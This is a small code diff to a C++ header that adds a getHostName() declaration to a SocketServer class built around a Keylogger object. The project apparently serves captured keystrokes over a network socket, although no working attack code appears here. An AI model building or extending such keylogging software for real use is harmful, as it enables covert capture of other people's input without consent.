@@ -27,6 +27,7 @@ public:
 	SocketServer(Keylogger* logger);
 	void start();
 	std::string getResponse(std::string request);
+	std::string getHostName();
 	~SocketServer();
 };
 
